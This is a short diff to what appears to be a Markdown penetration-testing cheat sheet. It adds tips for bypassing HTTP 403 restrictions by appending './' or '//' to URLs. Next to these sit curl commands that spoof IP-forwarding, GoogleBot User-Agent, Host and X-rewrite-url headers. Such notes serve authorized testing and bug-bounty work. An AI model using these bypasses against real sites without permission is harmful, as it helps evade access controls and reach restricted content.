@@ -239,6 +239,8 @@ cat arquivo.txt | awk -v value="[teste]>>> " '{print value$5}' | tr -d value=\" 
 <br>
 
 ### cURL 403 Bypasses: <br>
+- Note: Try adding `./`, `//` after the url <br>
+- Just like so: `site.com/./` OR `site.com//`... etc
 ```bash
 curl -s -k -X GET https://www.site.com/ -v -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -H "User-Agent: GoogleBot" -H "Content-Length:0"
 curl -i -s -k -X GET https://www.site.com/ -H "Host: www.site.co" -H "X-rewrite-url: directory"
